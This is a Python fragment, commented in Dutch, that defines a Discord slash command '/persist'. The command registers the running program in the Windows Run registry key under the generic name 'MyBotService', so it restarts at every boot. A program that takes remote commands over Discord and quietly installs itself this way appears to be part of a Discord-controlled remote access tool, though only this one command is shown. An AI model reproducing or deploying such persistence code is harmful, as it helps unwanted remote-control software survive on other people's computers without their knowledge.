# -----------------------------
# Persistance. Commando: /persist. 
# -----------------------------
#deze code maakt de bot permanent persistent. De bot zal automatisch opstarten bij het opstarten van Windows.
import winreg
import os
import sys

@bot.tree.command(name="persist", description="Enable eenmalig de persistence van de bot. De bot zal automatisch opstarten bij het opstarten van Windows.")
async def persist(interaction: discord.Interaction):
    # Pad naar dit script/exe en de naam in het register
    path = os.path.realpath(sys.argv[0])
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    try:
        # Open de 'Run' sleutel en voeg de waarde toe
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "MyBotService", 0, winreg.REG_SZ, path)
        winreg.CloseKey(key)
        await interaction.response.send_message("✅ Persistence succesvol ingesteld. Bot start automatisch op bij Windows boot.")
    except Exception as e:
        await interaction.response.send_message(f"❌ Fout bij instellen persistence: {e}")